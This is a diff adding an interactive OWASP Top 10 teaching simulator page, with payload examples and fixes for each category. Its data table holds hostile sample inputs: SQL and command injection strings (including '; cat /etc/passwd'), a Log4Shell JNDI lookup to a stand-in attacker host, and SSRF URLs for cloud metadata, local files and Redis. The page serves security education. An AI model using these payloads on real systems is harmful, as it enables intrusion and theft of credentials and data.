@@ -1,0 +1,1060 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>OWASP Top 10 (2021) — Interactive Walkthrough &amp; Defense Simulator</title>
+<style>
+  :root{
+    --bg-a:#0a0e1a; --bg-b:#05070d; --panel:#070a14; --border:#1e293b;
+    --green:#22c55e; --green-lt:#4ade80; --cyan:#22d3ee; --amber:#f59e0b;
+    --red:#ef4444; --purple:#a855f7; --blue:#3b82f6;
+    --text:#cbd5e1; --muted:#64748b;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{height:100%;overflow:hidden}
+  body{
+    font-family:'Courier New',ui-monospace,Menlo,monospace;
+    background:linear-gradient(160deg,var(--bg-a),var(--bg-b));
+    color:var(--text); display:flex; flex-direction:column;
+  }
+  body::before{
+    content:""; position:fixed; inset:0; pointer-events:none; z-index:9999;
+    background:repeating-linear-gradient(0deg,rgba(0,0,0,.15) 0 1px,transparent 1px 3px);
+    opacity:.35;
+  }
+  header{
+    display:flex; justify-content:space-between; align-items:center;
+    padding:8px 16px; border-bottom:1px solid var(--border);
+    background:rgba(7,10,20,.85); z-index:10;
+  }
+  header h1{ font-size:15px; letter-spacing:2px; color:#fcd34d;
+    text-shadow:0 0 8px rgba(245,158,11,.5); }
+  header .sub{ font-size:10px; color:var(--muted); letter-spacing:1px; }
+  .header-actions{ display:flex; gap:8px; }
+  .header-actions button{
+    font-family:inherit; font-size:10px; letter-spacing:1px;
+    background:#0b1220; border:1px solid var(--border); color:var(--text);
+    padding:5px 10px; border-radius:4px; cursor:pointer; transition:.15s;
+  }
+  .header-actions button:hover{ border-color:#fcd34d; color:#fcd34d; }
+  .header-actions button.active{
+    border-color:#fcd34d; color:#fcd34d;
+    box-shadow:0 0 10px rgba(245,158,11,.3);
+  }
+  .layout{ flex:1; display:flex; min-height:0; gap:1px; background:var(--border); }
+  .controls-pane{
+    width:340px; min-width:340px; background:var(--panel);
+    display:flex; flex-direction:column; overflow-y:auto; padding:10px; gap:10px;
+  }
+  .canvas-pane{ flex:1; position:relative; background:var(--panel); min-width:0; }
+  #stage{ display:block; width:100%; height:100%; }
+  .teaching-pane{
+    width:400px; min-width:400px; background:var(--panel);
+    display:flex; flex-direction:column; overflow:hidden;
+  }
+  .ctl-group{
+    border:1px solid var(--border); border-radius:5px;
+    background:#060912; padding:8px;
+  }
+  .ctl-group h3{
+    font-size:10px; letter-spacing:1.5px; color:var(--cyan);
+    margin-bottom:7px; text-transform:uppercase;
+  }
+  label.ctl-label{
+    display:block; font-size:10px; color:var(--muted); margin:6px 0 3px;
+  }
+  select,input[type=text],textarea{
+    width:100%; font-family:inherit; font-size:11px;
+    background:#0a0f1a; border:1px solid var(--border); color:var(--green-lt);
+    padding:5px 7px; border-radius:3px; outline:none;
+  }
+  select:focus,input:focus,textarea:focus{ border-color:#fcd34d; }
+  textarea{ resize:vertical; min-height:52px; line-height:1.4; font-family:'Courier New',monospace; font-size:10px; }
+  input[type=range]{
+    width:100%; -webkit-appearance:none; height:4px; background:#1e293b;
+    border-radius:2px; outline:none; margin:2px 0;
+  }
+  input[type=range]::-webkit-slider-thumb{
+    -webkit-appearance:none; width:13px; height:13px; border-radius:50%;
+    background:#fcd34d; cursor:pointer; box-shadow:0 0 7px rgba(245,158,11,.7);
+  }
+  input[type=range]::-moz-range-thumb{
+    width:13px; height:13px; border:none; border-radius:50%;
+    background:#fcd34d; cursor:pointer;
+  }
+  .slider-row{ display:flex; justify-content:space-between; font-size:10px; color:var(--muted); }
+  .slider-val{ color:#fcd34d; font-weight:bold; }
+  .btn-row{ display:flex; gap:6px; flex-wrap:wrap; margin-top:6px; }
+  button.act{
+    flex:1; min-width:70px; font-family:inherit; font-size:10px; letter-spacing:1px;
+    background:#0b1220; border:1px solid var(--border); color:var(--text);
+    padding:7px 6px; border-radius:4px; cursor:pointer; transition:.15s;
+    text-transform:uppercase;
+  }
+  button.act:hover{ border-color:#fcd34d; color:#fcd34d; }
+  button.act.primary{
+    background:linear-gradient(180deg,#2a1f0f,#1a1406);
+    border-color:#fcd34d; color:#fcd34d;
+    box-shadow:0 0 10px rgba(245,158,11,.25);
+  }
+  button.act.primary:hover{ box-shadow:0 0 16px rgba(245,158,11,.5); }
+  button.act.danger{ border-color:var(--red); color:#fca5a5; }
+  button.act.warn{ border-color:var(--amber); color:#fcd34d; }
+  button.act.ok{ border-color:var(--green); color:var(--green-lt); }
+  button.act.ok:hover{ background:#0f2a18; }
+  button.act.pulse{ animation:pulseAmber 1.4s infinite; }
+  @keyframes pulseAmber{
+    0%,100%{ box-shadow:0 0 6px rgba(245,158,11,.3); }
+    50%{ box-shadow:0 0 18px rgba(245,158,11,.8); }
+  }
+  .term{
+    background:#0a0f0a; border:1px solid #14321a; border-radius:4px;
+    padding:7px; font-size:10px; line-height:1.45; color:var(--green-lt);
+    height:150px; overflow-y:auto; white-space:pre-wrap; word-break:break-all;
+  }
+  .term::-webkit-scrollbar,.teaching-feed::-webkit-scrollbar,
+  .controls-pane::-webkit-scrollbar{ width:6px; }
+  .term::-webkit-scrollbar-thumb,.teaching-feed::-webkit-scrollbar-thumb,
+  .controls-pane::-webkit-scrollbar-thumb{ background:#1e293b; border-radius:3px; }
+  .term .prompt{ color:var(--green); }
+  .term .cursor{ display:inline-block; width:7px; height:12px; background:var(--green-lt);
+    animation:blink 1s step-end infinite; vertical-align:middle; }
+  @keyframes blink{ 50%{ opacity:0; } }
+  .metrics-grid{
+    display:grid; grid-template-columns:repeat(4,1fr); gap:5px;
+    padding:8px; border-bottom:1px solid var(--border);
+  }
+  .metric{
+    background:#060912; border:1px solid var(--border); border-radius:4px;
+    padding:5px 6px; text-align:center;
+  }
+  .metric .m-label{ font-size:8px; color:var(--muted); letter-spacing:.5px;
+    text-transform:uppercase; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+  .metric .m-value{ font-size:14px; font-weight:bold; color:var(--green-lt);
+    margin-top:2px; transition:color .2s; }
+  .metric.warn .m-value{ color:var(--amber); }
+  .metric.bad .m-value{ color:var(--red); }
+  .metric.amber .m-value{ color:#fcd34d; }
+  .info-card{
+    padding:8px; border-bottom:1px solid var(--border); font-size:10px;
+    line-height:1.5; color:var(--muted);
+  }
+  .info-card b{ color:var(--cyan); }
+  .info-card .eq{ color:var(--green-lt); font-size:10px;
+    background:#060912; padding:3px 5px; border-radius:3px;
+    display:inline-block; margin:2px 0; }
+  .teaching-feed{
+    flex:1; overflow-y:auto; padding:6px 8px; display:flex;
+    flex-direction:column; gap:4px;
+  }
+  .feed-item{
+    font-size:10px; line-height:1.45; padding:5px 7px; border-radius:3px;
+    background:#060912; border-left:3px solid var(--blue);
+    animation:feedIn .25s ease-out; word-break:break-word;
+  }
+  @keyframes feedIn{ from{ opacity:0; transform:translateX(10px); } to{ opacity:1; transform:none; } }
+  .feed-item .tag{
+    font-size:8px; font-weight:bold; letter-spacing:1px;
+    padding:1px 5px; border-radius:2px; margin-right:5px; display:inline-block;
+  }
+  .feed-item.info{ border-left-color:var(--blue); }
+  .feed-item.info .tag{ background:rgba(59,130,246,.2); color:#93c5fd; }
+  .feed-item.ok{ border-left-color:var(--green); }
+  .feed-item.ok .tag{ background:rgba(34,197,94,.2); color:var(--green-lt); }
+  .feed-item.warn{ border-left-color:var(--amber); }
+  .feed-item.warn .tag{ background:rgba(245,158,11,.2); color:#fcd34d; }
+  .feed-item.error{ border-left-color:var(--red); }
+  .feed-item.error .tag{ background:rgba(239,68,68,.2); color:#fca5a5; }
+  .feed-item.concept{ border-left-color:var(--purple); }
+  .feed-item.concept .tag{ background:rgba(168,85,247,.2); color:#d8b4fe; }
+  .feed-item.ethics{ border-left-color:#fbbf24; background:#1a1506; }
+  .feed-item.ethics .tag{ background:rgba(251,191,36,.25); color:#fde68a; }
+  .feed-item.cmd{
+    border-left-color:var(--green); background:#0a0f0a; color:var(--green-lt);
+    font-family:'Courier New',monospace; white-space:pre-wrap;
+  }
+  .feed-item.cmd .tag{ background:rgba(34,197,94,.2); color:var(--green-lt); }
+  .ethics-banner{
+    position:absolute; top:8px; left:50%; transform:translateX(-50%);
+    background:rgba(120,53,15,.85); border:1px solid var(--amber);
+    color:#fde68a; font-size:9px; padding:4px 12px; border-radius:4px;
+    letter-spacing:.5px; z-index:5; white-space:nowrap;
+    box-shadow:0 0 14px rgba(245,158,11,.3);
+  }
+  .footer-overlay{
+    position:absolute; bottom:6px; left:50%; transform:translateX(-50%);
+    font-size:8px; color:var(--muted); letter-spacing:.5px; z-index:5; white-space:nowrap;
+  }
+  .status-badges{
+    position:absolute; top:38px; left:10px; z-index:5;
+    display:flex; flex-direction:column; gap:4px;
+  }
+  .status-badge{
+    font-size:9px; background:rgba(7,10,20,.85); border:1px solid var(--border);
+    padding:3px 8px; border-radius:3px; color:var(--muted); letter-spacing:.5px;
+  }
+  .status-badge b{ color:#fcd34d; }
+  .status-badge.warn b{ color:var(--amber); }
+  .status-badge.bad b{ color:var(--red); }
+  .top10-grid{
+    position:absolute; top:38px; right:10px; z-index:5;
+    display:grid; grid-template-columns:1fr 1fr; gap:3px;
+  }
+  .top10-item{
+    font-size:8px; padding:3px 6px; background:rgba(7,10,20,.8);
+    border:1px solid var(--border); border-radius:3px; color:var(--muted);
+    cursor:pointer; transition:.15s; letter-spacing:.3px;
+    text-align:center; min-width:90px;
+  }
+  .top10-item:hover{ border-color:#fcd34d; color:#fcd34d; }
+  .top10-item.active{ border-color:#ef4444; color:#fca5a5;
+    background:rgba(239,68,68,.15); }
+  .top10-item.fixed{ border-color:#22c55e; color:#4ade80;
+    background:rgba(34,197,94,.12); }
+  .bottom-chain{
+    position:absolute; bottom:26px; left:10px; right:10px; z-index:5;
+    display:flex; gap:3px;
+  }
+  .bottom-phase{
+    flex:1; text-align:center; font-size:8px; letter-spacing:.5px;
+    padding:4px 2px; background:rgba(7,10,20,.8); border:1px solid var(--border);
+    border-radius:3px; color:var(--muted); transition:.2s;
+  }
+  .bottom-phase.done{ border-color:#fcd34d; color:#fcd34d;
+    background:rgba(245,158,11,.12); }
+  .bottom-phase.active{ border-color:#fcd34d; color:#fcd34d;
+    background:rgba(245,158,11,.2); box-shadow:0 0 10px rgba(245,158,11,.6);
+    animation:kcAmber 1.2s infinite; }
+  @keyframes kcAmber{ 50%{ box-shadow:0 0 16px rgba(245,158,11,.9); } }
+  .toast{
+    position:fixed; bottom:20px; left:50%; transform:translateX(-50%) translateY(60px);
+    background:#0b1220; border:1px solid var(--green); color:var(--green-lt);
+    padding:8px 18px; border-radius:4px; font-size:11px; letter-spacing:1px;
+    opacity:0; transition:.3s; z-index:10000; pointer-events:none;
+    box-shadow:0 0 20px rgba(34,197,94,.3);
+  }
+  .toast.show{ transform:translateX(-50%) translateY(0); opacity:1; }
+</style>
+</head>
+<body>
+<header>
+  <div>
+    <h1>OWASP TOP 10 (2021)</h1>
+    <span class="sub">A01-A10 · BROKEN ACCESS · CRYPTO · INJECTION · DESIGN · MISCONFIG</span>
+  </div>
+  <div class="header-actions">
+    <button class="teaching-toggle active" id="teachingToggle">📖 TEACHING: ON</button>
+    <button class="voice-toggle" id="voiceToggle">VOICE: OFF</button>
+  </div>
+</header>
+
+<div class="layout">
+  <aside class="controls-pane">
+    <div class="ctl-group">
+      <h3>◆ Category</h3>
+      <select id="catSelect">
+        <option value="A01">A01 — Broken Access Control</option>
+        <option value="A02">A02 — Cryptographic Failures</option>
+        <option value="A03">A03 — Injection</option>
+        <option value="A04">A04 — Insecure Design</option>
+        <option value="A05">A05 — Security Misconfiguration</option>
+        <option value="A06">A06 — Vulnerable &amp; Outdated Components</option>
+        <option value="A07">A07 — Identification &amp; Authentication Failures</option>
+        <option value="A08">A08 — Software &amp; Data Integrity Failures</option>
+        <option value="A09">A09 — Security Logging &amp; Monitoring Failures</option>
+        <option value="A10">A10 — Server-Side Request Forgery (SSRF)</option>
+      </select>
+      <label class="ctl-label">Sub-example</label>
+      <select id="exampleSelect">
+        <option value="0">[Loading...]</option>
+      </select>
+    </div>
+
+    <div class="ctl-group">
+      <h3>◆ Context</h3>
+      <label class="ctl-label">Target app</label>
+      <input type="text" id="appInput" value="vulnerable-app.example-corp.com">
+      <label class="ctl-label">Attacker payload</label>
+      <textarea id="payloadInput">GET /admin/users HTTP/1.1
+Host: vulnerable-app.example-corp.com
+Cookie: session=user_token_1001</textarea>
+    </div>
+
+    <div class="ctl-group">
+      <h3>◆ Parameters</h3>
+      <label class="ctl-label">Defense coverage <span class="slider-val" id="defVal">0%</span></label>
+      <input type="range" id="defSlider" min="0" max="100" value="0">
+      <label class="ctl-label">Detection capability</label>
+      <select id="detectSelect">
+        <option value="none">None (no WAF, no monitoring)</option>
+        <option value="waf">WAF only</option>
+        <option value="sast">SAST in CI/CD</option>
+        <option value="dast">DAST + WAF</option>
+        <option value="full">Full (SAST + DAST + WAF + RASP)</option>
+      </select>
+    </div>
+
+    <div class="ctl-group">
+      <h3>◆ Actions</h3>
+      <div class="btn-row">
+        <button type="button" class="act primary pulse" id="startBtn">▶ EXPLOIT</button>
+        <button type="button" class="act" id="stepBtn">⏭ STEP</button>
+        <button type="button" class="act danger" id="resetBtn">⟲ RESET</button>
+      </div>
+      <div class="btn-row">
+        <button type="button" class="act ok" id="fixBtn">🛡 FIX CATEGORY</button>
+        <button type="button" class="act" id="nextBtn">⏭ NEXT CATEGORY</button>
+      </div>
+    </div>
+
+    <div class="ctl-group">
+      <h3>◆ Terminal</h3>
+      <div class="term" id="terminal">
+        <span class="prompt">pentester@owasp:~$ </span><span id="termContent"></span><span class="cursor"></span>
+      </div>
+    </div>
+  </aside>
+
+  <main class="canvas-pane">
+    <canvas id="stage"></canvas>
+    <div class="ethics-banner">⚠ FOR EDUCATIONAL USE ONLY — OWASP Top 10 testing requires written authorization on target apps.</div>
+    <div class="status-badges">
+      <div class="status-badge">CAT: <b id="badgeCat">A01</b></div>
+      <div class="status-badge">SEV: <b id="badgeSev">CRITICAL</b></div>
+      <div class="status-badge">STATUS: <b id="badgeStatus">IDLE</b></div>
+      <div class="status-badge">CWE: <b id="badgeCWE">CWE-284</b></div>
+    </div>
+    <div class="top10-grid" id="top10Grid">
+      <div class="top10-item" data-cat="A01">A01 Access</div>
+      <div class="top10-item" data-cat="A02">A02 Crypto</div>
+      <div class="top10-item" data-cat="A03">A03 Injection</div>
+      <div class="top10-item" data-cat="A04">A04 Design</div>
+      <div class="top10-item" data-cat="A05">A05 Misconfig</div>
+      <div class="top10-item" data-cat="A06">A06 Components</div>
+      <div class="top10-item" data-cat="A07">A07 Auth</div>
+      <div class="top10-item" data-cat="A08">A08 Integrity</div>
+      <div class="top10-item" data-cat="A09">A09 Logging</div>
+      <div class="top10-item" data-cat="A10">A10 SSRF</div>
+    </div>
+    <div class="bottom-chain" id="bottomChain">
+      <div class="bottom-phase" id="bp-RECON">RECON</div>
+      <div class="bottom-phase" id="bp-EXPLOIT">EXPLOIT</div>
+      <div class="bottom-phase" id="bp-IMPACT">IMPACT</div>
+      <div class="bottom-phase" id="bp-DETECT">DETECT</div>
+      <div class="bottom-phase" id="bp-FIX">FIX</div>
+    </div>
+    <div class="footer-overlay">OWASP Top 10 (2021) · CWE · CVSS v3.1 · ASVS 4.0 · OWASP Testing Guide v4.2</div>
+  </main>
+
+  <aside class="teaching-pane">
+    <div class="metrics-grid">
+      <div class="metric amber" id="mCats"><div class="m-label">Categories</div><div class="m-value" id="mCatsVal">0</div></div>
+      <div class="metric" id="mExploited"><div class="m-label">Exploited</div><div class="m-value" id="mExploitedVal">0</div></div>
+      <div class="metric" id="mFixed"><div class="m-label">Fixed</div><div class="m-value" id="mFixedVal">0</div></div>
+      <div class="metric" id="mCWE"><div class="m-label">CWEs</div><div class="m-value" id="mCWEVal">0</div></div>
+      <div class="metric" id="mImpact"><div class="m-label">Impact</div><div class="m-value" id="mImpactVal">—</div></div>
+      <div class="metric" id="mDetect"><div class="m-label">Detected</div><div class="m-value" id="mDetectVal">NO</div></div>
+      <div class="metric" id="mScore"><div class="m-label">Risk Score</div><div class="m-value" id="mScoreVal">0.0</div></div>
+      <div class="metric" id="mDefense"><div class="m-label">Posture</div><div class="m-value" id="mDefenseVal">WEAK</div></div>
+    </div>
+    <div class="info-card">
+      <b>OWASP Top 10 (2021) — the definitive list of web app risks.</b><br>
+      <span class="eq">A01 Access Control · A02 Crypto · A03 Injection</span><br>
+      <span class="eq">A04 Insecure Design · A05 Misconfig · A06 Components</span><br>
+      <span class="eq">A07 Auth · A08 Integrity · A09 Logging · A10 SSRF</span><br>
+      <span style="color:var(--purple)">OWASP Top 10 (2021) · ASVS 4.0 · CWE Top 25</span>
+    </div>
+    <div class="teaching-feed" id="teachingFeed"></div>
+  </aside>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+"use strict";
+
+var STATE = {
+  running:false,
+  cat:'A01',
+  example:0,
+  app:'vulnerable-app.example-corp.com',
+  payload:'',
+  defense:0,
+  detect:'none',
+  categories:0,
+  exploited:0,
+  fixed:0,
+  cwes:0,
+  impact:'—',
+  detected:false,
+  score:0,
+  posture:'WEAK',
+  phaseIdx:0,
+  tick:0,
+  lastTime:0,
+  events:[],
+  nodes:[],
+  feedCount:0,
+  exploitedCats:{},
+  fixedCats:{}
+};
+
+var PHASES = ['RECON','EXPLOIT','IMPACT','DETECT','FIX'];
+
+var CATEGORIES = {
+  A01:{title:'Broken Access Control',cwe:'CWE-284',sev:'CRITICAL',score:9.1,
+    detail:'Authorization is not enforced. Users can access resources or perform actions beyond their permissions.',
+    examples:[
+      {name:'IDOR — access other user records', payload:'GET /api/users/1002/profile HTTP/1.1\nCookie: session=user_1001_token', impact:'Read/Modify any user data'},
+      {name:'Forced browsing to /admin', payload:'GET /admin/users HTTP/1.1\nCookie: session=user_1001_token', impact:'Admin panel exposed to non-admins'},
+      {name:'Missing function-level check', payload:'POST /api/deleteUser?id=1002 HTTP/1.1\nCookie: session=user_1001_token', impact:'Delete any user'},
+      {name:'JWT claim tampering', payload:'{\"sub\":\"1001\",\"role\":\"admin\"}', impact:'Escalate to admin'}
+    ],
+    fix:'Deny by default. Enforce authz on every request, server-side. Use per-object checks (not just per-route). Log every access decision. Role-based or attribute-based access control.'
+  },
+  A02:{title:'Cryptographic Failures',cwe:'CWE-327',sev:'HIGH',score:7.5,
+    detail:'Sensitive data exposed due to weak crypto, missing encryption, or misuse.',
+    examples:[
+      {name:'Cleartext HTTP', payload:'GET http://app.example-corp/login', impact:'Credentials in plaintext'},
+      {name:'MD5 password hash', payload:'md5(password)', impact:'Fast brute force'},
+      {name:'ECB mode encryption', payload:'AES-ECB repeated blocks reveal patterns', impact:'Pattern leakage'},
+      {name:'Hardcoded keys', payload:'api_key = "sk_live_abc123..."', impact:'Full compromise if source leaked'}
+    ],
+    fix:'Use TLS 1.3 everywhere. Argon2id/bcrypt for passwords. AES-GCM/ChaCha20 for data. Secrets in KMS/HSM. Rotate keys.'
+  },
+  A03:{title:'Injection',cwe:'CWE-89',sev:'CRITICAL',score:9.8,
+    detail:'Untrusted data interpreted as code (SQL, NoSQL, OS, LDAP, XPath).',
+    examples:[
+      {name:'SQL injection', payload:"' OR '1'='1' --", impact:'Full DB read/write'},
+      {name:'Command injection', payload:'; cat /etc/passwd', impact:'RCE'},
+      {name:'NoSQL injection', payload:'{"$ne": null}', impact:'Auth bypass'},
+      {name:'LDAP injection', payload:'*)(uid=*))(|(uid=*', impact:'Auth bypass'}
+    ],
+    fix:'Parameterized queries. ORM with proper escaping. Command whitelist. Context-aware output encoding.'
+  },
+  A04:{title:'Insecure Design',cwe:'CWE-657',sev:'HIGH',score:7.0,
+    detail:'Missing or ineffective control design. Threat modeling gap.',
+    examples:[
+      {name:'No rate limit on password reset', payload:'Loop /reset-password', impact:'Account takeover'},
+      {name:'Recovery questions guessable', payload:'mother maiden name = "smith"', impact:'Account takeover'},
+      {name:'Trusting client-side validation', payload:'Modify amount from 10 to 100000 in POST', impact:'Financial loss'},
+      {name:'No CAPTCHA on signup', payload:'Bulk register accounts', impact:'Spam, fraud'}
+    ],
+    fix:'Threat modeling (STRIDE). Secure design patterns. Rate limiting + CAPTCHA. Server-side validation. Business logic tests.'
+  },
+  A05:{title:'Security Misconfiguration',cwe:'CWE-16',sev:'HIGH',score:7.5,
+    detail:'Default configs, unnecessary features, verbose errors, missing hardening.',
+    examples:[
+      {name:'Default creds', payload:'admin/admin', impact:'Full compromise'},
+      {name:'Debug endpoint exposed', payload:'GET /debug/env', impact:'Env + secrets leaked'},
+      {name:'Directory listing', payload:'GET /backup/', impact:'Files enumerated'},
+      {name:'Verbose stack traces', payload:'Error → file paths + framework version', impact:'Info disclosure'}
+    ],
+    fix:'CIS Benchmarks. Automated config scanning. Remove defaults. Disable debug in prod. Principle of least functionality.'
+  },
+  A06:{title:'Vulnerable & Outdated Components',cwe:'CWE-1035',sev:'HIGH',score:7.5,
+    detail:'Using components with known vulnerabilities.',
+    examples:[
+      {name:'Log4Shell (CVE-2021-44228)', payload:'${jndi:ldap://attacker/x}', impact:'RCE'},
+      {name:'Spring4Shell (CVE-2022-22965)', payload:'class.module.classLoader...', impact:'RCE'},
+      {name:'Old jQuery (XSS)', payload:'<img src=x onerror=...>', impact:'XSS'},
+      {name:'Outdated TLS library', payload:'HEARTBLEED', impact:'Key extraction'}
+    ],
+    fix:'SBOM + SCA in CI. Patch management. Remove unused dependencies. Pin versions. Monitor CVE feeds.'
+  },
+  A07:{title:'Identification & Authentication Failures',cwe:'CWE-287',sev:'HIGH',score:8.0,
+    detail:'Weak auth, session management, or credential recovery.',
+    examples:[
+      {name:'Credential stuffing', payload:'Try leaked user:pass pairs', impact:'Account takeover'},
+      {name:'No MFA on sensitive ops', payload:'Change password from any session', impact:'Session hijack'},
+      {name:'Session fixation', payload:'Set session before login', impact:'Hijack after login'},
+      {name:'Weak password policy', payload:'password123 accepted', impact:'Brute force'}
+    ],
+    fix:'MFA everywhere (FIDO2). Rate limit + lockout. HIBP integration. Session rotation on login. Strong password policy (NIST 800-63B).'
+  },
+  A08:{title:'Software & Data Integrity Failures',cwe:'CWE-345',sev:'HIGH',score:7.5,
+    detail:'Trusting untrusted data/code without verification (CI/CD, deserialization, auto-update).',
+    examples:[
+      {name:'Insecure deserialization', payload:'Java serialized payload with gadget chain', impact:'RCE'},
+      {name:'Unsigned update download', payload:'Man-in-the-middle update binary', impact:'Malware injection'},
+      {name:'Unverified npm package', payload:'Typosquat package', impact:'Supply chain RCE'},
+      {name:'No integrity on CI artifacts', payload:'Poisoned build cache', impact:'Malicious release'}
+    ],
+    fix:'Sign artifacts (Sigstore). Verify checksums. SCA + SBOM. Allowlist of dependencies. Immutable CI. Provenance attestation (SLSA).'
+  },
+  A09:{title:'Security Logging & Monitoring Failures',cwe:'CWE-778',sev:'MEDIUM',score:6.0,
+    detail:'Insufficient logging prevents detection and forensics.',
+    examples:[
+      {name:'No login logging', payload:'1000 failed logins — no alert', impact:'Undetected brute force'},
+      {name:'Logs not centralized', payload:'Attacker wipes local logs', impact:'No forensics'},
+      {name:'No alert on admin action', payload:'Mass user deletion unnoticed', impact:'Insider threat'},
+      {name:'PII in logs (bad)', payload:'Password printed', impact:'Secondary breach'}
+    ],
+    fix:'Centralize logs (SIEM). Alert on security events (auth, authz, admin, data). Retain 90+ days. Never log secrets. Test detection.'
+  },
+  A10:{title:'Server-Side Request Forgery (SSRF)',cwe:'CWE-918',sev:'HIGH',score:8.5,
+    detail:'App fetches attacker-controlled URL. Internal services exposed.',
+    examples:[
+      {name:'Cloud metadata', payload:'http://169.254.169.254/latest/meta-data/', impact:'IAM creds stolen'},
+      {name:'Internal scan', payload:'http://10.0.0.5:8080/admin', impact:'Internal compromise'},
+      {name:'file:// scheme', payload:'file:///etc/passwd', impact:'Local file read'},
+      {name:'Gopher → Redis', payload:'gopher://127.0.0.1:6379/...', impact:'RCE'}
+    ],
+    fix:'URL allowlist. Block RFC1918/link-local. IMDSv2. No redirects. Verify resolved IP. Segment network.'
+  }
+};
+
+var canvas = document.getElementById('stage');
+var ctx = canvas.getContext('2d');
+var terminalContent = document.getElementById('termContent');
+var teachingFeed = document.getElementById('teachingFeed');
+
+function resizeCanvas(){
+  var pane = canvas.parentElement;
+  canvas.width = pane.clientWidth;
+  canvas.height = pane.clientHeight;
+  buildTopology();
+}
+window.addEventListener('resize', resizeCanvas);
+
+function buildTopology(){
+  var W = canvas.width, H = canvas.height;
+  STATE.nodes = [
+    {id:'attacker', label:'attacker', ip:'external', x:0.10*W, y:0.40*H, icon:'attacker', color:'#ef4444', glow:0, blink:0},
+    {id:'waf', label:'WAF', ip:'edge', x:0.28*W, y:0.40*H, icon:'firewall', color:'#22d3ee', glow:0, blink:0},
+    {id:'app', label:'vulnerable app', ip:STATE.app.split('.')[0], x:0.50*W, y:0.40*H, icon:'server', color:'#fcd34d', glow:0, blink:0},
+    {id:'db', label:'database', ip:'10.0.0.20', x:0.70*W, y:0.20*H, icon:'database', color:'#a855f7', glow:0, blink:0},
+    {id:'files', label:'file system', ip:'/var/www', x:0.70*W, y:0.60*H, icon:'server', color:'#3b82f6', glow:0, blink:0},
+    {id:'siem', label:'SIEM', ip:'logs + alerts', x:0.90*W, y:0.40*H, icon:'server', color:'#22c55e', glow:0, blink:0}
+  ];
+}
+
+function drawIcon(type, x, y, color, glow, blink, label, ip){
+  ctx.save();
+  ctx.translate(x, y);
+  if(glow > 0){
+    var g = ctx.createRadialGradient(0,0,2,0,0,42);
+    g.addColorStop(0, 'rgba(245,158,11,'+(glow*0.55)+')');
+    g.addColorStop(1, 'rgba(0,0,0,0)');
+    ctx.fillStyle = g;
+    ctx.beginPath(); ctx.arc(0,0,42,0,Math.PI*2); ctx.fill();
+  }
+  ctx.strokeStyle = color; ctx.fillStyle = color;
+  ctx.lineWidth = 1.4;
+  ctx.shadowColor = color; ctx.shadowBlur = glow > 0 ? 8 : 0;
+
+  switch(type){
+    case 'server': {
+      ctx.strokeRect(-11,-16,22,32);
+      for(var i=0;i<5;i++){
+        var yy = -14 + i*6;
+        ctx.strokeRect(-9,yy,18,4.5);
+        ctx.fillStyle = blink%2===0 ? '#22c55e' : '#166534';
+        ctx.beginPath(); ctx.arc(7,yy+2.2,1.3,0,Math.PI*2); ctx.fill();
+        ctx.fillStyle = color;
+      }
+      break;
+    }
+    case 'database': {
+      var rx = 13, ry = 5, h = 22;
+      ctx.beginPath(); ctx.ellipse(0,-h/2,rx,ry,0,0,Math.PI*2); ctx.stroke();
+      ctx.beginPath(); ctx.moveTo(-rx,-h/2); ctx.lineTo(-rx,h/2); ctx.stroke();
+      ctx.beginPath(); ctx.moveTo(rx,-h/2); ctx.lineTo(rx,h/2); ctx.stroke();
+      ctx.beginPath(); ctx.ellipse(0,h/2,rx,ry,0,0,Math.PI*2); ctx.stroke();
+      ctx.beginPath(); ctx.ellipse(0,0,rx,ry,0,0,Math.PI*2); ctx.stroke();
+      break;
+    }
+    case 'firewall': {
+      ctx.lineWidth = 1.2;
+      for(var row=0;row<3;row++){
+        var y2 = -10 + row*7;
+        var off = row%2===0 ? 0 : 5;
+        for(var col=0;col<4;col++) ctx.strokeRect(-16+col*9+off, y2, 8, 6);
+      }
+      ctx.fillStyle = '#22c55e';
+      ctx.beginPath();
+      ctx.moveTo(0,-4); ctx.quadraticCurveTo(4,0,0,5); ctx.quadraticCurveTo(-4,0,0,-4);
+      ctx.fill();
+      break;
+    }
+    case 'attacker': {
+      ctx.beginPath();
+      ctx.arc(0,-6,7,Math.PI,0);
+      ctx.lineTo(8,8); ctx.lineTo(-8,8); ctx.closePath();
+      ctx.fillStyle = 'rgba(239,68,68,.3)'; ctx.fill(); ctx.stroke();
+      ctx.fillStyle = '#ef4444';
+      ctx.beginPath(); ctx.arc(-2.5,-5,1.5,0,Math.PI*2); ctx.fill();
+      ctx.beginPath(); ctx.arc(2.5,-5,1.5,0,Math.PI*2); ctx.fill();
+      break;
+    }
+  }
+  ctx.restore();
+  ctx.save();
+  ctx.font = 'bold 9px "Courier New",monospace';
+  ctx.textAlign = 'center';
+  ctx.fillStyle = color;
+  ctx.fillText(label, x, y + 30);
+  ctx.font = '8px "Courier New",monospace';
+  ctx.fillStyle = '#64748b';
+  ctx.fillText(ip, x, y + 40);
+  ctx.restore();
+}
+
+function spawnPacket(fromId, toId, color, label, speed){
+  var from = STATE.nodes.find(function(n){return n.id===fromId;});
+  var to = STATE.nodes.find(function(n){return n.id===toId;});
+  if(!from || !to) return;
+  STATE.events.push({type:'packet', from:{x:from.x,y:from.y}, to:{x:to.x,y:to.y},
+    t:0, speed:speed||0.02, color:color, label:label, size:5});
+}
+
+function escapeHtml(s){
+  return String(s)
+    .replace(/&/g,'&amp;')
+    .replace(/</g,'&lt;')
+    .replace(/>/g,'&gt;')
+    .replace(/"/g,'&quot;')
+    .replace(/'/g,'&#39;');
+}
+
+function addFeed(tag, text, type){
+  type = type || 'info';
+  var div = document.createElement('div');
+  div.className = 'feed-item ' + type;
+  var time = new Date().toLocaleTimeString('en-US',{hour12:false});
+  div.innerHTML = '<span class="tag">' + escapeHtml(tag) + '</span> ' +
+    '<span style="color:#475569">[' + time + ']</span> ' + escapeHtml(text);
+  teachingFeed.insertBefore(div, teachingFeed.firstChild);
+  STATE.feedCount++;
+  while(teachingFeed.children.length > 75) teachingFeed.removeChild(teachingFeed.lastChild);
+  speak(text);
+}
+function addCommandFeed(cmd, output){
+  var div = document.createElement('div');
+  div.className = 'feed-item cmd';
+  div.innerHTML = '<span class="tag">CMD</span><br>' +
+    '<span style="color:#4ade80">pentester@owasp:~$ </span>' +
